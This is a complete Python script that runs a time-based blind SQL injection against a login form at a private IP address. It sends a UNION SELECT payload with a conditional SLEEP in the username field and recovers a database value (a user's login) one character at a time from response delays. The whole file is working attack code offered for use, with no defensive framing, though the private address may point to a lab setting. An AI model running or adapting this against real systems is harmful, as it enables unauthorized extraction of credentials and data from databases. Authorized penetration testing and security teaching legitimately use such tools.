import requests
import string
import time

TARGET_URL = 'http://10.10.0.8/'
CHARSET = string.ascii_letters + string.digits + string.punctuation # Change for `string.printable` for include whitespaces
QUERY = 'SELECT login FROM users WHERE id = 2 LIMIT 0, 1'
DELAY = 5
THRESHOLD = DELAY - 0.5
PAYLOAD_TEMPLATE = (
    "' UNION SELECT 1, 2, IF(SUBSTRING(({query}), {position}, 1) = '{char}', SLEEP({delay}), NULL); -- -"
)
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Content-Type': 'application/x-www-form-urlencoded'
}



def build_data(payload):
    return {
        'username': payload,
        'password': '0'
    }

def test_char(position, char):
    payload = PAYLOAD_TEMPLATE.format(
        query=QUERY,
        position=position,
        char=char,
        delay=DELAY
    )

    data = build_data(payload)

    try:
        start = time.time()
        requests.post(TARGET_URL, data=data, headers=HEADERS, timeout=DELAY + 2)
        end = time.time()
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return False

    delta = end - start
    return delta > THRESHOLD

def main():
    result = ''

    print(f'\n[*] Starting Blind SQL Injection Time-Based Extraction...')
    print(f'[*] Target: {TARGET_URL}')
    print(f'[*] Query: {QUERY}\n')

    for position in range(1, 100):
        found = False

        for char in CHARSET:
            if test_char(position, char):
                result += char
                print(f'\n[+] Found character at position {position}: {char}')
                print(f'[!] Current result: {result}')
                found = True
                break

        if not found:
            print(f'\n[!] No character found at position {position}. Assuming end of string.')
            break

    print(f'\n[✔] Extraction complete! Result: {result}\n')
    return result



if __name__ == '__main__':
    main()
